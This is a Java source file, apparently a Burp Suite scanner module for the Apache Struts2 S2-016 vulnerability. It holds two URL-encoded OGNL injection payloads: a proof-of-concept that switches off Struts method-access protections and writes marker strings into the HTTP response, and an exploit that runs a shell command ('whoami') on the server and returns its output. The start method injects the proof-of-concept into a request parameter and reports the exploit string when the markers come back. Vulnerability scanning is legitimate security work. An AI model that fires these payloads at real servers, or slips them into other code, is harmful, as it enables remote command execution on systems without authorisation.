package module;

import burp.*;

import java.net.URLEncoder;

public class S2_016 extends IModule {
    public S2_016() {
        // TODO
        //redirectAction:和action: 也可触发漏洞
        poc =
            "redirect:${" +
            "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
            "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
            "#f.setAccessible(true)," +
            "#f.set(#_memberAccess,true),"+
            "#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()," +
            "#genxor.print(\"" + injectMark[0] + "\")," +
            "#genxor.print(\"" + injectMark[1] + "\")," +
            "#genxor.flush()," +
            "#genxor.close()" +
            "}";
        poc = URLEncoder.encode(poc);

        exp =
            "redirect:${" +
            "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
            "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
            "#f.setAccessible(true)," +
            "#f.set(#_memberAccess,true)," +
            "#a=@java.lang.Runtime@getRuntime().exec(\"whoami\").getInputStream()," +
            "#b=new java.io.InputStreamReader(#a)," +
            "#c=new java.io.BufferedReader(#b)," +
            "#d=new char[5000]," +
            "#c.read(#d)," +
            "#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()," +
            "#genxor.print(#d)," +
            "#genxor.flush()," +
            "#genxor.close()" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        IParameter newParameter = helpers.buildParameter(poc, "1", in);
        request = helpers.updateParameter(request, newParameter);
        if (check()) {
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return null;
    }
}
